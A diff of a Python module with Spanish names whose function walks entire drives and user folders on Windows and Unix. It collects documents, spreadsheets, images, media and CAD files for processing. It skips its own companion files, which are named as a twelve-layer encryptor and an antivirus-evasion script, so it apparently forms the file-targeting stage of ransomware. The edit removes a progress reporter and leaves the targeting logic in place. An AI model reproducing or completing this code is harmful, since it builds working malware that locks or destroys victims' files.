@@ -11,24 +11,9 @@ def es_admin():
         return False
 
 
-def actualizar_progreso_escaneo(mensaje, archivos, porcentaje):
-    try:
-        with open("progreso_escaneo.txt", "w", encoding="utf-8") as f:
-            f.write("="*60 + "\\n")
-            f.write("ESCANEO\\n")
-            f.write("="*60 + "\\n\\n")
-            f.write(f"Archivos: {archivos:,}\\n")
-            f.write(f"Estado: {mensaje}\\n\\n")
-            barra = int(porcentaje / 2)
-            f.write(f"[{'#'*barra}{'-'*(50-barra)}] {porcentaje}%\\n")
-    except:
-        pass
-
-
 def escanear_sistema():
     sistema = platform.system()
     admin = es_admin()
-    
     extensiones = {
         '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
         '.odt', '.ods', '.odp', '.rtf', '.tex', '.wpd', '.wps', '.pages',
@@ -79,10 +64,8 @@ def escanear_sistema():
         '.dwg', '.dxf', '.skp', '.blend', '.max', '.3ds', '.obj', '.fbx',
         '.stl', '.step', '.stp', '.iges', '.igs', '.sat', '.sldprt', '.sldasm',
         '.slddrw', '.ipt', '.iam', '.idw', '.prt', '.asm', '.drw', '.catpart',
-        '.catproduct', '.cgr', '.3dm', '.rvt', '.rfa', '.rte', '.rft',
-        ''
+        '.catproduct', '.cgr', '.3dm', '.rvt', '.rfa', '.rte', '.rft', ''
     }
-    
     if admin:
         evitar_parcial = set()
     else:
@@ -93,19 +76,11 @@ def escanear_sistema():
             'AppData\\Local\\Microsoft\\Windows\\INetCache',
             'AppData\\Local\\Microsoft\\Windows\\WebCache'
         }
-    
-    archivos_app = {
-        'index.py', 'rutas.py', 'acciones.py', 'encriptador_12_capas.py',
-        'evasion_av.py', 'launcher.py', 'launcher.bat', 'launcher.sh',
-        'imagen_sin.jpg', 'ADMINISTRADOR.jpg'
-    }
-    
+    archivos_app = {'launcher.py', 'rutas.py', 'encriptador_12_capas.py', 'evasion_av.py', 'launcher.bat', 'launcher.sh'}
     dir_app = os.path.abspath(os.getcwd())
-    
     archivos_encontrados = []
     contador_ext = defaultdict(int)
     total = 0
-    
     if sistema == "Windows":
         if admin:
             rutas_escanear = ['C:\\']
@@ -121,20 +96,13 @@ def escanear_sistema():
                 os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Pictures'),
                 os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Videos'),
                 os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Music'),
-                'C:\\Users',
-                'D:\\',
-                'E:\\',
-                'F:\\'
+                'C:\\Users', 'D:\\', 'E:\\', 'F:\\'
             ]
     else:
         rutas_escanear = ['/home', '/']
-    
-    actualizar_progreso_escaneo("Iniciando...", 0, 1)
-    
     for ruta_base in rutas_escanear:
         if not os.path.exists(ruta_base):
             continue
-        
         try:
             for root, dirs, files in os.walk(ruta_base):
                 if not admin:
@@ -144,46 +112,30 @@ def escanear_sistema():
                             debe_excluir = True
                             dirs[:] = []
                             break
-                    
                     if debe_excluir:
                         continue
-                
                 root_abs = os.path.abspath(root)
                 if root_abs == dir_app:
                     dirs[:] = []
                     continue
-                
                 for archivo in files:
                     try:
                         total += 1
-                        
-                        if total % 500 == 0:
-                            porc = min(95, int(len(archivos_encontrados) / 100))
-                            actualizar_progreso_escaneo("Escaneando...", len(archivos_encontrados), porc)
-                        
                         if archivo.lower() in [x.lower() for x in archivos_app]:
                             continue
-                        
                         ext = os.path.splitext(archivo)[1].lower()
                         ruta_completa = os.path.join(root, archivo)
-                        
                         incluir = False
-                        
                         if ext in extensiones:
                             incluir = True
                         elif ext == '':
                             incluir = True
                             ext = '[sin_ext]'
-                        
                         if incluir:
                             archivos_encontrados.append(ruta_completa)
                             contador_ext[ext] += 1
-                        
                     except:
                         continue
         except:
             continue
-    
-    actualizar_progreso_escaneo("Completado", len(archivos_encontrados), 100)
-    
     return archivos_encontrados, contador_ext, total
